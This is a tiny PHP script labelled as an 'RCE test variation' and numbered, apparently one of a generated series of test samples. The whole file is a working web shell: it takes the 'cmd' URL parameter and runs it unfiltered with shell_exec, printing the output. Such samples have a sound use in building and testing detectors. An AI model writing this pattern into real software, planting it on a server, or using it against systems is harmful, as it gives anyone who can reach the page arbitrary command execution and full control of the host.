<?php
// RCE test variation #974
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>